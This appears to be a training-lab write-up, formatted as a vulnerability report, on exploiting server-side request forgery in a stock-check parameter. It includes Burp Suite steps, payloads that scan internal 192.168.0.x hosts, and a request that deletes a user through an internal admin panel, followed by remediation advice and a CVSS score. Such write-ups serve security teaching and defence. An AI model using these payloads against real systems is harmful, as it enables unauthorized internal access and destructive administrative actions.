# Title: SSRF: Basic SSRF against another back-end system

## Description

The application is vulnerable to Server-Side Request Forgery (SSRF) within the stock check functionality. User-supplied URLs are fetched by the server without sufficient validation or access restrictions.

Because the server performs requests on behalf of users, an attacker can leverage the vulnerable functionality to access internal network resources that are not directly reachable from the internet.

In this case, the vulnerability allows enumeration of hosts within an internal network range and access to an administrative interface running on a backend system. The exposed administrative functionality can then be used to perform privileged actions, including deletion of user accounts.

---

## Steps to Exploit

### 1. Identify the Vulnerable Parameter

1. Navigate to a product page.
2. Click **Check Stock**.
3. Intercept the request using Burp Suite.

Example request:

```http
POST /product/stock HTTP/1.1

stockApi=http://stock-server.example.com/check?product=1
```

Observe that the application fetches data from a URL specified by the `stockApi` parameter.

---

### 2. Test Internal Network Access

Modify the request:

```http
stockApi=http://192.168.0.1:8080/admin
```

Send the request to Burp Intruder.

---

### 3. Enumerate Internal Hosts

Highlight the final octet of the IP address:

```http
stockApi=http://192.168.0.§1§:8080/admin
```

Configure Intruder:

| Setting      | Value   |
| ------------ | ------- |
| Payload Type | Numbers |
| From         | 1       |
| To           | 255     |
| Step         | 1       |

Launch the attack.

---

### 4. Identify the Administrative Interface

Review the results and sort by HTTP status code.

Most responses return:

```http
404 Not Found
```

or

```http
500 Internal Server Error
```

One host returns:

```http
200 OK
```

This indicates that an administrative interface exists on that internal host.

Example:

```http
http://192.168.0.42:8080/admin
```

---

### 5. Access Administrative Functionality

Send the successful request to Burp Repeater.

Modify the URL:

```http
stockApi=http://192.168.0.42:8080/admin
```

Forward the request.

The response contains administrative functionality.

---

### 6. Delete the Target User

Modify the request:

```http
stockApi=http://192.168.0.42:8080/admin/delete?username=carlos
```

Forward the request.

The user account is deleted successfully.

---

## Proof of Concept

### Initial SSRF Payload

```http
stockApi=http://192.168.0.1:8080/admin
```

### Internal Network Scan

```http
stockApi=http://192.168.0.§x§:8080/admin
```

### Successful Internal Host

```http
stockApi=http://192.168.0.42:8080/admin
```

### Administrative Action

```http
stockApi=http://192.168.0.42:8080/admin/delete?username=carlos
```

### Result

```text
Administrative action executed successfully
```

The successful deletion confirms access to an internal administrative service through SSRF.

---

## Impact

* Access to internal network resources.
* Exposure of administrative interfaces.
* Circumvention of network segmentation controls.
* Internal service enumeration and reconnaissance.
* Unauthorized administrative actions.
* Potential compromise of backend infrastructure.
* Privilege escalation through trusted internal services.

---

## Mitigation / Remediation

### 1. Implement URL Allow-Listing

Restrict outbound requests to explicitly approved destinations.

Example:

```text
https://inventory.company.com
https://stock.company.com
```

---

### 2. Block Internal Network Access

Prevent requests to:

```text
127.0.0.0/8
10.0.0.0/8
172.16.0.0/12
192.168.0.0/16
169.254.0.0/16
```

and other internal address ranges.

---

### 3. Validate and Sanitize URLs

Perform strict validation of user-supplied URLs before processing.

---

### 4. Apply Network Segmentation

Restrict application servers from accessing sensitive internal systems whenever possible.

---

### 5. Implement Authentication on Administrative Interfaces

Internal services should require authentication even when accessed from trusted networks.

---

### 6. Monitor Outbound Requests

Detect abnormal requests to:

* Internal IP addresses
* Administrative interfaces
* Cloud metadata services

---

## CVSS Score

**CVSS v3.1 Score:** 8.8 (High)

**Vector:**

```text
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
```

---

## CVSS Justification

| Metric              | Value     | Justification                                     |
| ------------------- | --------- | ------------------------------------------------- |
| Attack Vector       | Network   | Exploitable remotely via HTTP requests            |
| Attack Complexity   | Low       | Requires only modification of a URL parameter     |
| Privileges Required | None      | No authentication required                        |
| User Interaction    | None      | No victim interaction required                    |
| Scope               | Unchanged | Impact remains within the application environment |
| Confidentiality     | High      | Internal services become accessible               |
| Integrity           | High      | Administrative actions can be executed            |
| Availability        | None      | No direct disruption required                     |

---

## Conclusion

The application is vulnerable to Server-Side Request Forgery because it allows user-controlled URLs to be fetched by the server without sufficient validation. An attacker can abuse this functionality to enumerate internal hosts, access administrative interfaces, and perform privileged actions that would normally be inaccessible from external networks. Proper outbound request restrictions and network segmentation are required to mitigate this vulnerability.
